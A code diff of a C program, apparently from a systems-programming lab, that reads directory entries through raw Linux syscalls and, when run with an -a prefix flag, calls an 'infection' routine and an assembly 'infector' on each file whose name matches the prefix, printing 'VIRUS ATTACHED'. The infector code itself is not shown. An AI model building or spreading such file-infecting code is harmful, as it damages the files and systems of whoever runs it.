@@ -1,5 +1,8 @@
 #include "util.h"          // for strlen, strncmp, etc.
-
+#include <fcntl.h>         // For open(), O_RDONLY, O_DIRECTORY, etc.
+#include <sys/syscall.h>   // For SYS_getdents
+#include <linux/types.h>   // For __u32, __u64, etc.
+#include "syscall.h"
 extern int system_call();
 
 // Raw syscall numbers
@@ -65,71 +68,53 @@ void print_error_exit() {
 
 
 int main(int argc, char **argv) {
-    char *prefix = 0; // Pointer to prefix text, if -a is given
-    int i; // Loop variable for command line arguments
-    
-    // Check for -a flag
+    char *prefix = 0;
+    int i;
     for (i = 1; i < argc; i++) {
         if (strncmp(argv[i], "-a", 2) == 0) {
             prefix = argv[i] + 2; // pointer to prefix text
         }
     }
     
-    // Call infection() once if -a supplied
+    // call infection() once if -a supplied
     if (prefix) {
-        print(prefix);
-        print("\n");
-        infection(); // Call infection function in start.s
+        infection();
     }
     
-    // Open current directory in read-only mode
+    // open curr dir
     int fd = sys_call(SYS_OPEN, (int)".", O_RDONLY|O_DIRECTORY, 0, 0, 0);
     if (fd < 0) {
-        print("Failed to open directory\n");
         print_error_exit();
     }
-    print("\n");
 
-    // Read directory entries via getdents (32-bit version)
-    char buf[BUF_SIZE] __attribute__((aligned(16)));
+    // Read directory entries via getdents
+    char buf[BUF_SIZE];
     int nread = sys_call(SYS_GETDENTS, fd, (int)buf, BUF_SIZE, 0, 0);
     if (nread < 0) {
-        print("Error in getdents, code: ");
-        print("\n");
         print_error_exit();
     }
-    
-    // Process directory entries
-    int pos = 0;
-    // Loop through the buffer to read directory entries 
-    while (pos < nread) {
-        struct linux_dirent *d = (struct linux_dirent *)(buf + pos);
+
+    int bpos = 0;
+    // Iterate over entries in the buffer
+    while (bpos < nread) {
+        struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
         char *name = d->d_name;
-        
-        // Skip "." and ".." entries which are not files to infect
-        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
-            print(name);
-            print("\n");
-            pos += d->d_reclen; // Advance to next entry
-            continue;
-        }
-        
-        // Print the filename
+        // Print the filename first
         print(name);
-        
-        // If -a<prefix> given and name starts with prefix so infect 
+        // If -a<prefix> given and name starts with it → infect the file
         if (prefix && strncmp(name, prefix, strlen(prefix)) == 0) {
             print(" VIRUS ATTACHED\n");
+            // call an assembly function
             infector(name);
         } else {
             print("\n");
         }
-        
-        // Advance to next entry
-        pos += d->d_reclen;
+
+        // advance to next file
+        bpos += d->d_reclen;
     }
-    
-    // Close directory and exit
-    sys_call(SYS_CLOSE, fd, 0, 0, 0, 0);
+
+    sys_call(SYS_CLOSE, fd, 0,0,0,0);
+    sys_call(SYS_EXIT, 0, 0,0,0,0); // normal exit
     return 0;
 }
